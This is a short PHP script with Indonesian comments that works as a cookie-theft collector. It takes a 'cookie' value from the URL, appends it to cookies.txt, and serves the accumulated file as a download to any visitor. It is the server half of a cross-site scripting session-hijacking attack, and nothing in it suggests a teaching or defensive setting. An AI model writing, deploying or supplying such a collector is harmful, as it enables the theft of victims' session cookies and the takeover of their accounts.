<?php
// Menerima cookie dari parameter URL
$cookie = isset($_GET['cookie']) ? $_GET['cookie'] : 'No cookie received';  
$file = 'cookies.txt'; // Nama file untuk menyimpan cookie

// Simpan cookie ke dalam file
file_put_contents($file, $cookie . PHP_EOL, FILE_APPEND);

// Mengatur header untuk mengunduh file
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="' . $file . '"');
readfile($file);
exit();
?>
